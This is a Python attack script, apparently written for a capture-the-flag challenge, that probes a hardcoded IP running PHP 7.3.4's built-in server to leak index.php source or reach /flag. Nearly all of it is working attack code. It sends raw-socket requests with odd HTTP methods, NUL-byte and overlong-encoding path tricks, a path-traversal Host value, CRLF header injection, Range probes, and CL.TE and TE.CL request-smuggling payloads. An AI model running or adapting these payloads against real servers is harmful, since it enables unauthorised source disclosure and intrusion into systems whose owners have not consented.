#!/usr/bin/env python3
"""
PHP Built-in Development Server - Special behaviors
PHP 7.3.4 specific testing
"""
import requests
import socket
import struct

target = "http://61.147.171.35:51810"
target_host = "61.147.171.35"
target_port = 51810

def send_raw(data):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((target_host, target_port))
        sock.send(data)
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if len(response) > 100000:
                    break
            except:
                break
        sock.close()
        return response
    except Exception as e:
        return str(e).encode()

def test_source_method():
    """PHP built-in server has special handling for certain methods"""
    print("Testing special HTTP methods...")
    
    methods = [
        "SOURCE", "VIEW", "DEBUG", "READ", "COPY", "MOVE",
        "PROPFIND", "PROPPATCH", "MKCOL", "LOCK", "UNLOCK",
        "REPORT", "MKACTIVITY", "CHECKOUT", "MERGE",
        "M-SEARCH", "NOTIFY", "SUBSCRIBE", "UNSUBSCRIBE",
        "SEARCH", "SPACEJUMP", "TEXTSEARCH", "CONNECT",
    ]
    
    for method in methods:
        raw = f"{method} /index.php HTTP/1.0\r\nHost: {target_host}:{target_port}\r\n\r\n".encode()
        response = send_raw(raw)
        
        if b"<?php" in response:
            print(f"[+] SOURCE DISCLOSURE via {method}!")
            print(response.decode('utf-8', errors='ignore')[:500])
            return True
        elif b"Hello World" not in response and b"404" not in response and b"405" not in response:
            print(f"[?] {method}: {response[:100]}")
    
    return False

def test_path_special_chars():
    """Test path with special characters that might bypass execution"""
    print("\nTesting paths with special characters...")
    
    # PHP built-in server has interesting path handling
    paths = [
        # These might trick the server into serving raw file
        "/index.php%00",
        "/index.php%00.html",
        "/index.php%2500",
        "/index.php/..",
        "/index.php/../index.php",
        "/index.php/.",
        "/index.php%ff",
        "/index.php%ef%bb%bf",  # BOM
        "/index.php%c0%80",  # Overlong NUL
        "/index.php\t",
        "/index.php\r",
        "/index.php\n",
        "/index.php%09",
        "/index.php%0d",
        "/index.php%0a",
        "/./././index.php",
        "/index.php;.txt",
        "/index.php?.txt",
        "/index.php#.txt",
    ]
    
    for path in paths:
        # URL encode properly
        raw = f"GET {path} HTTP/1.0\r\nHost: {target_host}:{target_port}\r\n\r\n".encode('latin-1')
        response = send_raw(raw)
        
        if b"<?php" in response or b"<?" in response:
            print(f"[+] SOURCE via path: {path}")
            print(response.decode('utf-8', errors='ignore')[:500])
            return True
        elif b"Hello World" not in response and b"404" not in response and b"400" not in response:
            print(f"[?] {path[:30]}: Status in response")

def test_host_header_tricks():
    """Test Host header manipulation"""
    print("\nTesting Host header tricks...")
    
    hosts = [
        "localhost",
        "127.0.0.1",
        "127.0.0.1:80",
        "[::1]",
        "0",
        "0.0.0.0",
        "",
        "../../../etc/passwd",
        "example.com",
        "localhost\r\nX-Injected: true",
    ]
    
    for host in hosts:
        raw = f"GET /index.php HTTP/1.1\r\nHost: {host}\r\n\r\n".encode('latin-1')
        response = send_raw(raw)
        
        if b"<?php" in response:
            print(f"[+] SOURCE via Host: {host}")
            return True
        elif b"Hello World" not in response and b"404" not in response and b"400" not in response:
            print(f"[?] Host={host[:20]}: Different response")

def test_range_header():
    """Test Range header for partial file read"""
    print("\nTesting Range header...")
    
    ranges = [
        "bytes=0-100",
        "bytes=0-",
        "bytes=-100",
        "bytes=0-0",
        "bytes=0-10000",
        "bytes=0-0,0-100",
    ]
    
    for r in ranges:
        raw = f"GET /index.php HTTP/1.1\r\nHost: {target_host}:{target_port}\r\nRange: {r}\r\n\r\n".encode()
        response = send_raw(raw)
        
        if b"<?php" in response:
            print(f"[+] SOURCE via Range: {r}")
            return True
        elif b"206" in response:
            print(f"[+] Partial content: {r}")
            print(response[:300])

def test_request_smuggling():
    """Test HTTP request smuggling"""
    print("\nTesting request smuggling...")
    
    # Try to smuggle a request that might bypass normal processing
    smuggle = (
        b"GET /index.php HTTP/1.1\r\n"
        b"Host: " + target_host.encode() + b":" + str(target_port).encode() + b"\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Content-Length: 4\r\n"
        b"\r\n"
        b"0\r\n"
        b"\r\n"
        b"GET /flag HTTP/1.1\r\n"
        b"Host: " + target_host.encode() + b"\r\n"
        b"\r\n"
    )
    
    response = send_raw(smuggle)
    print(f"Smuggle response: {response[:300]}")

def test_te_cl():
    """Test TE.CL desync"""
    print("\nTesting TE.CL desync...")
    
    payload = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + target_host.encode() + b":" + str(target_port).encode() + b"\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: 4\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        b"5c\r\n"
        b"GPOST / HTTP/1.1\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: 15\r\n"
        b"\r\n"
        b"x=1\r\n"
        b"0\r\n"
        b"\r\n"
    )
    
    response = send_raw(payload)
    print(f"TE.CL response: {response[:300]}")

if __name__ == "__main__":
    print(f"Target: {target}")
    print("=" * 60)
    
    test_source_method()
    test_path_special_chars()
    test_host_header_tricks()
    test_range_header()
    test_request_smuggling()
    test_te_cl()
    
    print("\nAll tests completed.")
